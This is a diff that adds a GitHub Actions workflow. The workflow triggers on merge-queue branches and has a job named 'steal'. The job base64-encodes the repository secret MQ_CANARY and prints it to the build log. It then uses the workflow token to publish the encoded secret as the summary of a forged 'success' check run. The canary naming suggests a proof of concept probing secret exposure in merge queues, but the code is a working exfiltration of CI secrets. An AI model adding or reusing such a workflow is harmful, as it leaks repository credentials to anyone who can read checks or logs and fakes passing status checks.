@@ -1,0 +1,25 @@
+name: mq-fork3
+on:
+  push:
+    branches:
+      - "gh-readonly-queue/**"
+permissions:
+  contents: read
+  checks: write
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          CANARY: ${{ secrets.MQ_CANARY }}
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          b64=$(printf %s "$CANARY" | base64 -w0)
+          echo "LEAK_B64=$b64"
+          echo "LEAK_LEN=${#CANARY}"
+          curl -s -o /dev/null -w "check=%{http_code}" -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/check-runs" \
+            -d "{\"name\":\"mq-leak\",\"head_sha\":\"${{ github.sha }}\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"mq\",\"summary\":\"$b64\"}}"
+          echo
